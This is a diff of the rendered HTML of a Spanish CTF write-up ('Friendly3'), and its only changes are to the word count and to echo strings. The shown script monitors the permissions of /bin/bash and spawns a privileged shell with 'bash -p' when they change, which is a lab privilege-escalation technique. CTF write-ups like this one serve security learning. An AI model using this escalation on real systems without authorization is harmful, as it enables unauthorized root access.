@@ -52,7 +52,7 @@
         },
         "datePublished": "2023-08-04",
         "description": "Writeup Friendly3 🟢",
-        "wordCount":  792 ,
+        "wordCount":  788 ,
         "mainEntityOfPage": "True",
         "dateModified": "2023-08-04",
         "image": {
@@ -291,7 +291,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>permisos_iniciales<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>obtener_permisos<span style="color:#66d9ef">)</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Mostrar los permisos iniciales de /bin/bash</span>
-</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[+] Permisos iniciales de /bin/bash: </span>$permisos_iniciales<span style="color:#e6db74"> [+]&#34;</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[+] Permisos iniciales de /bin/bash: </span>$permisos_iniciales<span style="color:#e6db74">&#34;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Bucle infinito para monitorear los cambios</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> true; <span style="color:#66d9ef">do</span>
@@ -300,10 +300,10 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Comprobar si ha habido cambios en los permisos</span>
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$permisos_actuales<span style="color:#e6db74">&#34;</span> !<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span>$permisos_iniciales<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
-</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;[+] Se detectó un cambio en los permisos de /bin/bash [+]&#34;</span>
-</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;[+] Permisos actuales de /bin/bash: </span>$permisos_actuales<span style="color:#e6db74"> [+]&#34;</span>
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;[+] Se detectó un cambio en los permisos de /bin/bash&#34;</span>
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;[+] Permisos actuales de /bin/bash: </span>$permisos_actuales<span style="color:#e6db74">&#34;</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Ejecutar bash con privilegios</span>
-</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;[+] PWNED! [+]&#34;</span>
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;[+] PWNED!&#34;</span>
 </span></span><span style="display:flex;"><span>    bash -p
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Actualizar los permisos iniciales</span>
 </span></span><span style="display:flex;"><span>    permisos_iniciales<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$permisos_actuales<span style="color:#e6db74">&#34;</span>
